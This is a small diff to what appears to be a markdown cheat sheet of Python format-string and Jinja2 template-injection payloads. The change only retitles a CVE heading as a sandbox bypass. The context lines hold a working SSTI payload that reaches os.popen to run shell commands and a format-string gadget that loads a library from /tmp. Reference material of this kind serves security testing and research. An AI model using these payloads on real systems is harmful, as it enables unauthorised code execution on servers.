@@ -32,7 +32,7 @@ print("{a.unlink.__globals__[sys].modules[ctypes].cdll[/tmp/testload]}".format(a
 
 `{{''.__class__.__mro__[1].__subclasses__()[182].__init__.__globals__["__builtins__"]["__import__"]('os').popen('ls').read()}}`
 
-## [CVE-2025-27516](https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403) 
+## SandboxedEnvironment bypass [CVE-2025-27516](https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403) 
 
 ### Read var
 
